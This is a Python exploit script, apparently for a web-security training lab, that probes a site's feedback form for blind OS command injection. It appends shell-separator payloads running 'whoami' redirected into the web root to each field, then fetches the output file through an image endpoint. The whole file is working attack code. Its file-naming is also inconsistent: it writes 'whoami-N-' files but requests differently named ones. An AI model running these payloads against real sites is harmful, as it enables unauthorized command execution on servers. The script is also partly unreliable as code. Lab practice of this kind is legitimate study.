import requests
import urllib3
import sys
from bs4 import BeautifulSoup

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def cmd_inj(url):
    s = requests.Session()
    r = s.get(url+'feedback', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']

    #data = dict()
    #keys = int(input('Number of data parameters? '))
    #for i in range(0,keys):
     #   pair = input("Enter key:value - ")
     #   temp = pair.split(':')
     #   data[temp[0]] = temp[1]
    #print(data)
    #data['csrf']=csrf
    #print(data)
    
    #file = 1
    #cmd_tests = [
     #   f'|| whoami >  /var/www/images/whoami{file}.txt; x || whoami >  /var/www/images/whoami{file}.txt &',
     #   f'| whoami >  /var/www/images/whoami{file}.txt |',
      #  f'& whoami >  /var/www/images/whoami{file}.txt &',
      #  f'; whoami >  /var/www/images/whoami{file}.txt ;',
      #  f'%0a whoami >  /var/www/images/whoami{file}.txt %0a',
      #  f"' whoami >  /var/www/images/whoami{file}.txt",
      #  f'`whoami > /var/www/images/whoami{file}.txt`' # May not return 500
    #]

    #for cmd in cmd_tests:        
    data = {
      'csrf':csrf,
      'name':'asdf',
      'email':'asdf@example.com',
      'subject':'asdf',
      'message':'asdf'
    }
    file = 1
    f = open('./blind_redirection.txt','w+')
    for k in data:
        if k != 'csrf':
            
            #print(data[k])

            cmd_tests = [
                f'|| whoami >  /var/www/images/whoami-1-{file}.txt; x || whoami >  /var/www/images/whoami{file}.txt &',
                f'| whoami >  /var/www/images/whoami-2-{file}.txt |',
                f'& whoami >  /var/www/images/whoami-3-{file}.txt &',
                f'; whoami >  /var/www/images/whoami-4-{file}.txt ;',
                f'%0a whoami >  /var/www/images/whoami-5-{file}.txt %0a',
                f"' whoami >  /var/www/images/whoami-6-{file}.txt",
                f'`whoami > /var/www/images/whoamiback-7-{file}.txt`' # May not return 500
            ]

            for cmd in cmd_tests:
                
                #print(file)
                data[k] = data[k] + cmd
                #print(cmd)
                r_1 = s.post(url=url+'feedback/submit', proxies=proxies, verify=False, data=data)
                if r_1.status_code == 500:
                    print(f"Possible vulnerability in {k} for {cmd}")
                    print(f"Returned {r_1.status_code}")
                    print('[+] Attempting to access output')
                    r_2 = requests.get(url+f'image?filename=whoami{file}.txt', proxies=proxies, verify=False)
                    if r_2.status_code == 200:
                        print("[+] Request successful")
                        print(f"[+] Returned {r_2.text}")
                        f.write(f"\n********** \n {k} - {cmd} \n {r_2.text}")
                    print('---------------------------------------------------------------------------------')
                    
                if  '`' in cmd:
                    r_3 = requests.get(url+f'image?filename=whoamiback{file}.txt', proxies=proxies, verify=False)
                    if r_3.status_code == 200:
                        print(f"[+] Possible vulnerability in {k} for {cmd}")
                        print(f'[+] {r_3.text}')
                        print('---------------------------------------------------------------------------------')
                        f.write(f"\n********** \n {k} - {cmd} \n {r_3.text}")
                data[k] = data[k].replace(cmd,'')
            
            file += 1
            
            data[k] = data[k].replace(cmd,'')
            #print(data)
    f.close()
        

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #data = sys.argv[2].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f"[-] Example: {sys.argv[0]} www.example.com/feedback ")
        sys.exit(-1)
    
    print('[-] Attempting command redirection')
    exploit = cmd_inj(url)
    #print(exploit)